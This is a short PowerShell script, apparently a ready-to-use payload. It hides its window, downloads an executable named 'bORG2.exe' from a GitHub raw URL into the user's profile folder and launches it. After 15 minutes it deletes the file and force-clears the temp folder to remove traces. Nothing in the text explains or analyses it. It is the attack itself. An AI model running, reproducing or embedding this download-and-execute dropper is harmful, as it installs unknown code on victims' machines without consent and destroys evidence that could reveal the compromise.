powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:USERPROFILE\bORG2.exe
start-process "$env:USERPROFILE\bORG2.exe"
start-sleep 900
rm "$env:USERPROFILE\bORG2.exe"
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
